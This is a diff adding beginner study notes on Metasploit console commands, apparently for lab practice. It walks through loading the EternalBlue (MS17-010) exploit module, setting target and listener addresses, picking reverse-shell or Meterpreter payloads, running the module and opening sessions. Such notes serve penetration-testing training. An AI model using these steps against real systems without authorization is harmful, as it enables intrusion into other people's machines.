@@ -202,3 +202,145 @@ post/
 └── windows
 
 ```
+
+---
+# Basic Commands :
+## 1️⃣ `msfconsole`
+
+**Definition:**  
+Launches the Metasploit Framework console.
+
+**Example:**
+
+```
+msfconsole
+```
+
+
+## 2️⃣ `search`
+
+**Definition:**  
+Searches Metasploit modules by name, CVE, type, or platform.
+
+**Example:**
+
+`search ms17-010`
+
+➡️ Lists all modules related to the MS17-010 vulnerability.
+
+---
+
+## 3️⃣ `use`
+
+**Definition:**  
+Selects a module to work with (enters module context).
+
+**Example (by name):**
+
+`use exploit/windows/smb/ms17_010_eternalblue`
+
+**Example (by index):**
+
+`use 2`
+
+---
+
+## 4️⃣ `show options`
+
+**Definition:**  
+Displays required and optional parameters for the selected module.
+
+**Example:**
+
+`show options`
+
+➡️ Shows options like `RHOSTS`, `RPORT`, `LHOST`, etc.
+
+---
+
+## 5️⃣ `set`
+
+**Definition:**  
+Sets a value for a module option.
+
+**Example:**
+
+`set RHOSTS 10.10.29.187`
+
+Another example:
+
+`set LHOST 10.10.16.17`
+
+---
+
+## 6️⃣ `show payloads`
+
+**Definition:**  
+Lists payloads compatible with the selected exploit.
+
+**Example:**
+
+`show payloads`
+
+➡️ Helps you choose between:
+
+- `shell_reverse_tcp`
+    
+- `meterpreter/reverse_tcp`
+    
+- staged vs single payloads
+    
+
+---
+
+## 7️⃣ `run`
+
+**Definition:**  
+Executes the selected module with the configured options.
+
+**Example:**
+
+`run`
+
+(You can also use `exploit`, which does the same thing.)
+
+---
+
+## 8️⃣ `sessions`
+
+**Definition:**  
+Lists all active sessions created after exploitation.
+
+**Example:**
+
+`sessions`
+
+**Interact with a session:**
+
+`sessions -i 1`
+
+---
+
+## 9️⃣ `back`
+
+**Definition:**  
+Exits the current module context and returns to the main prompt.
+
+**Example:**
+
+`back`
+
+---
+
+## 🔟 `info`
+
+**Definition:**  
+Displays detailed information about a module (author, CVE, description, options).
+
+**Example (inside module):**
+
+`info`
+
+**Example (from main prompt):**
+
+`info exploit/windows/smb/ms17_010_eternalblue`
